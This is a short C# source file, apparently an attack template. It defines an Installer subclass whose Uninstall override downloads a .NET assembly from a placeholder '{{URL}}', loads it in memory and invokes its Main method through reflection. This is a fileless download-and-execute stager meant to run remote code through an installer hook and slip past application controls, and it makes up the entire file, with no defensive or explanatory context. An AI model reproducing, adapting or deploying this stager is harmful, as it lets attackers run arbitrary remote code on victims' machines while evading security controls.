using System;
using System.Reflection;
using System.Configuration.Install;

namespace Craft
{
    class Program
    {
        static void Main(string[] args)
        {

        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] data = client.DownloadData("{{URL}}");
            Assembly asm = Assembly.Load(data);
            Type program = asm.GetType("Craft.Program");
            MethodInfo main = program.GetMethod("Main", BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            main.Invoke(null, null);
            return ;
        }
    }
}